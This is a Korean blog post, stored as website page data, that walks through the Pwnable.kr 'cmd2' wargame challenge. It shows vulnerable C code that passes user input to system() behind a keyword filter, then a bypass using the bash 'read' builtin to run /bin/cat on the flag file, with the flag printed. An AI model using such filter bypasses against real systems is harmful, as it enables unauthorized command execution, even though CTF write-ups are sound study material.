{"componentChunkName":"component---src-templates-blog-post-tsx","path":"/articles/2016-08/Pwnable.kr-cmd2","result":{"data":{"site":{"siteMetadata":{"title":"GyeongSu Han's Github Pages","author":"@micalgenus","siteUrl":"https://micalgenus.github.io"}},"markdownRemark":{"id":"19107301-eef7-5f6e-858d-6e213bf7711d","html":"<p>cmd1의 플래그를 패스워드로 사용하여 cmd2에 접속할 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">cmd2@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ cat cmd2<span class=\"token punctuation\">.</span>c\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span> cmd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">int</span> r<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"PATH\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"export\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"`\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    r <span class=\"token operator\">+=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> <span class=\"token string\">\"flag\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> r<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> environ<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">delete_env</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> p<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">=</span>environ<span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span> p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>    <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">delete_env</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PATH=/no_command_execution_until_you_become_a_hacker\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>저번 문제에서 사용했던 <code><b><code class=\"language-text\"></code></b></code>와 <strong><code class=\"language-text\">/</code></strong>를 사용할 수 없게 되었다.</p>\n<p>그리고 추가적으로 환경변수를 모두 제거하여 환경변수에 등록하여 사용하는 방법은 막히게 되었다.</p>\n<p>그럼 이 문제는 다른 방법으로 풀어야 하는데, 이 문제에서 사용할 수 있는 방법은 배쉬의 <code class=\"language-text\">기본함수</code>를 이용하는 방법이다.</p>\n<p>내가 선택한 방법은 <code class=\"language-text\">read</code>를 이용한 방법이다.</p>\n<p>read는 읽어들여 변수에 저장하는 방법이다. 명령을 읽어들이게 하여 <code class=\"language-text\">system</code>함수에서 읽어들인 명령을 수행하도록 만드는게 목표이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cmd2@ubuntu:~$ <span class=\"token builtin class-name\">read</span> i<span class=\"token punctuation\">;</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token variable\">$i</span>\n<span class=\"token builtin class-name\">test</span>\n^D\n<span class=\"token builtin class-name\">test</span></code></pre></div>\n<p>다음과 같이 읽어들인 내용이 i변수에 저장됨을 볼 수 있다. <code class=\"language-text\">$i</code>를 <code class=\"language-text\">echo</code>의 인자로 주었는데 인자로 주지 않고 수행하는것을 보자.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cmd2@ubuntu:~$ <span class=\"token builtin class-name\">read</span> i<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span>\n<span class=\"token function\">ls</span>\n^D\ncmd2  cmd2.c  flag</code></pre></div>\n<p>ls 명령이 정상적으로 실행된다. <code class=\"language-text\">read i; $i</code> 라는 문자열은 filter에 걸리지 않으므로 정상적으로 수행시킬 수 있는 내용이다.</p>\n<p>이를 이용하여 문제를 해결해 보도록 하겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">cmd2@ubuntu:~$ ./cmd2 <span class=\"token string\">\"read i; \\<span class=\"token variable\">$i</span>\"</span>\n<span class=\"token builtin class-name\">read</span> i<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span>\n/bin/cat /home/cmd2/flag\nFuN_w1th_5h3ll_v4riabl3s_haha</code></pre></div>","frontmatter":{"categories":["Wargame"],"title":"Pwnable.kr cmd2","date":"Aug 28, 2016","tags":["Pwnable.kr"]}}},"pageContext":{"comments":true,"previous":{"frontmatter":{"path":"/articles/2016-08/Pwnable.kr-cmd1","title":"Pwnable.kr cmd1","comments":true}},"next":{"frontmatter":{"path":"/articles/2016-09/Pwnable.kr-lotto","title":"Pwnable.kr lotto","comments":true}}}}}